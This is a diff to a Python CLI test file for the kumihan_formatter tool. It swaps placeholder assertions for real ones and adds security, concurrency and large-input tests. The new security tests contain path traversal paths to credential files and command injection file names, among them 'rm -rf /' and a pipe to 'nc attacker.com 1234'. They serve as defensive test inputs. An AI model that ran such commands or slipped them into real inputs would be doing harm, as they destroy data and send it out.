@@ -13,6 +13,11 @@ from click.testing import CliRunner
 
 from kumihan_formatter.cli import cli, main, register_commands, setup_encoding
 
+# テスト定数
+THREAD_COUNT = 5
+THREAD_TIMEOUT_SECONDS = 10
+LARGE_FILENAME_LENGTH = 1000
+
 
 class TestCLIBasics(TestCase):
     """CLI基本機能のテスト"""
@@ -65,10 +70,10 @@ class TestCLIBasics(TestCase):
     def test_encoding_setup_non_windows(self) -> None:
         """非Windows環境でのエンコーディング設定テスト"""
         with patch("sys.platform", "linux"):
-            # 非Windows環境では何も起こらないことを確認
-            setup_encoding()
-            # エラーが発生しないことを確認
-            self.assertTrue(True)
+            # 非Windows環境では何も起こらない（例外が発生しないことをテスト）
+            result = setup_encoding()
+            # 戻り値がNoneであることを確認
+            self.assertIsNone(result)
 
 
 class TestCommandRegistration(TestCase):
@@ -105,11 +110,11 @@ class TestCommandRegistration(TestCase):
                     # インポートエラーが発生してもクラッシュしないことを確認
                     try:
                         register_commands()
+                        # エラーが発生せずに完了した場合もOK
+                        self.assertIsInstance(test_cli, click.Group)
                     except ImportError:
-                        pass  # エラーが発生することを想定
-
-                    # エラーが適切にハンドリングされることを確認
-                    self.assertTrue(True)  # テストが完了することを確認
+                        # ImportErrorが発生することを想定
+                        self.assertIsInstance(test_cli, click.Group)
 
     def test_register_commands_optional_commands_failure(self) -> None:
         """オプショナルコマンドの失敗処理テスト"""
@@ -352,6 +357,123 @@ class TestCLIIntegration(TestCase):
             self.assertNotEqual(result.exit_code, 0)
 
 
+class TestCLISecurity(TestCase):
+    """CLIセキュリティテスト"""
+
+    def setUp(self) -> None:
+        """テスト環境のセットアップ"""
+        self.runner = CliRunner()
+
+    def test_path_traversal_prevention(self) -> None:
+        """パストラバーサル攻撃の防止テスト"""
+        with patch(
+            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
+        ) as mock_command:
+            mock_instance = MagicMock()
+            mock_command.return_value = mock_instance
+
+            register_commands()
+
+            # パストラバーサル攻撃のパターンをテスト
+            malicious_paths = [
+                "../../../etc/passwd",
+                "..\\..\\..\\windows\\system32\\config\\sam",
+                "/etc/shadow",
+                "C:\\Windows\\System32\\config\\SAM",
+            ]
+
+            for malicious_path in malicious_paths:
+                result = self.runner.invoke(cli, ["convert", malicious_path])
+                # コマンドが実行されても、セキュリティチェックが働くことを確認
+                self.assertNotEqual(
+                    result.exit_code, -1
+                )  # システムクラッシュしないことを確認
+
+    def test_command_injection_prevention(self) -> None:
+        """コマンドインジェクション攻撃の防止テスト"""
+        with patch(
+            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
+        ) as mock_command:
+            mock_instance = MagicMock()
+            mock_command.return_value = mock_instance
+
+            register_commands()
+
+            # コマンドインジェクションのパターンをテスト
+            injection_attempts = [
+                "file.txt; rm -rf /",
+                "file.txt && cat /etc/passwd",
+                "file.txt | nc attacker.com 1234",
+                "$(whoami).txt",
+            ]
+
+            for injection in injection_attempts:
+                result = self.runner.invoke(cli, ["convert", injection])
+                # コマンドインジェクションが実行されないことを確認
+                self.assertNotEqual(result.exit_code, -1)
+
+
+class TestCLIPerformance(TestCase):
+    """CLIパフォーマンステスト"""
+
+    def setUp(self) -> None:
+        """テスト環境のセットアップ"""
+        self.runner = CliRunner()
+
+    def test_large_input_handling(self) -> None:
+        """大規模入力の処理テスト"""
+        with patch(
+            "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
+        ) as mock_command:
+            mock_instance = MagicMock()
+            mock_command.return_value = mock_instance
+
+            register_commands()
+
+            # 大きなファイル名をテスト
+            large_filename = "a" * LARGE_FILENAME_LENGTH + ".txt"
+            result = self.runner.invoke(cli, ["convert", large_filename])
+
+            # システムがハングしないことを確認
+            self.assertIsNotNone(result.exit_code)
+
+    def test_concurrent_command_execution(self) -> None:
+        """並行コマンド実行のテスト"""
+        import threading
+        import time
+
+        results = []
+
+        def run_command():
+            """コマンドを実行する関数"""
+            with patch(
+                "kumihan_formatter.commands.convert.convert_command.ConvertCommand"
+            ) as mock_command:
+                mock_instance = MagicMock()
+                mock_command.return_value = mock_instance
+
+                register_commands()
+                runner = CliRunner()
+                result = runner.invoke(cli, ["convert", "test.txt"])
+                results.append(result.exit_code)
+
+        # 複数スレッドで同時実行
+        threads = []
+        for i in range(THREAD_COUNT):
+            thread = threading.Thread(target=run_command)
+            threads.append(thread)
+            thread.start()
+
+        # すべてのスレッドの完了を待つ
+        for thread in threads:
+            thread.join(timeout=THREAD_TIMEOUT_SECONDS)
+
+        # すべてのコマンドが正常に完了することを確認
+        self.assertEqual(len(results), THREAD_COUNT)
+        for exit_code in results:
+            self.assertIsNotNone(exit_code)
+
+
 class TestCLIModuleLevel(TestCase):
     """CLIモジュールレベルのテスト"""
 
@@ -373,4 +495,6 @@ class TestCLIModuleLevel(TestCase):
 
             # mainが呼ばれないことを確認（テスト実行時は__main__ではない）
             # 実際のスクリプト実行はintegration testで確認
-            self.assertTrue(True)  # インポートエラーがないことを確認
+            self.assertFalse(
+                mock_main.called
+            )  # モジュールインポート時にmainが呼ばれないことを確認
